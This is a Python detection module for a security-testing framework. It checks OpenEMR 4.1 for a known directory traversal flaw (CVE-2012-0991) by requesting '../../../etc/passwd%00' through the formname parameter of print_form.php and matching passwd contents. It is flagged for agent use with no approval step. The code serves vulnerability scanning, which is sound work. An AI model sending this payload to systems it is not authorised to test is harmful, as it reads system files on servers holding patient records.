#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in OpenEMR 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenEMR 4.1 - Local File Inclusion Detection',
        'description': 'Multiple directory traversal vulnerabilities in OpenEMR 4.1.0 allow remote authenticated users to read arbitrary files via a .. (dot dot) in the formname parameter to (1) contrib/acog/print_form.php; or (2) load_form.php, (3) view_form.php, or (4) trend_form.php in interface/patient_file/encounter.',
        'author': ['KittySploit Team'],
        'severity': 'low',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'lfi', 'openemr', 'traversal', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36650',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-0991',
            'http://www.open-emr.org/wiki/index.php/OpenEMR_Patches',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/72914',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2012-0991',
    }

    def run(self):
        r = self.http_request(method="GET", path='/contrib/acog/print_form.php?formname=../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='low',
                reason="OpenEMR 4.1 - Local File Inclusion detected",
                path='/contrib/acog/print_form.php?formname=../../../etc/passwd%00',
            )
            return True
        return False

